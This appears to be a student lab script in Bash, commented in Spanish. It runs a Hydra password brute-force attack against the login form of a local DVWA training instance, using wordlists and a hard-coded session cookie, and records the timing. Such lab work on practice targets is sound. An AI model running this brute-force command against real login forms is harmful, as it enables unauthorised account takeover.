#!/bin/bash

# ==========================================
# CONFIGURACIÓN DEL ATAQUE
# ==========================================
PHPSESSID="e85e601283e3b30636487e6d4c5613e9"

USUARIOS=~/Documents/temp/lab2cripto/informe/dics/u.txt
PASSWORDS=~/Documents/temp/lab2cripto/informe/dics/p.txt
SALIDA=~/Documents/temp/lab2cripto/informe/hydra/resultados_exitosos2.txt

echo "=== DVWA Hydra Brute Force ==="
echo "[*] PHPSESSID: $PHPSESSID"
echo "[*] Iniciando ataque..."
echo ""

# Registrar tiempo de inicio
INICIO=$(date +%s%N)

hydra -L "$USUARIOS" \
      -P "$PASSWORDS" \
      localhost -s 8806 http-get-form \
      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=$PHPSESSID:S=Welcome" \
      -o "$SALIDA" -vV

# Registrar tiempo de fin y calcular duración
FIN=$(date +%s%N)
DURACION_NS=$((FIN - INICIO))
DURACION_SEG=$(echo "scale=3; $DURACION_NS / 1000000000" | bc)

echo ""
echo "======================================"
echo "[*] Ataque finalizado."
echo "[*] Tiempo total de ejecución: ${DURACION_SEG} segundos"
echo "[*] Resultados guardados en: $SALIDA"
echo "======================================"

# Agregar el tiempo de ejecución al archivo de resultados
echo "" >> "$SALIDA"
echo "--------------------------------------" >> "$SALIDA"
echo "Tiempo total de ejecución: ${DURACION_SEG} segundos" >> "$SALIDA"
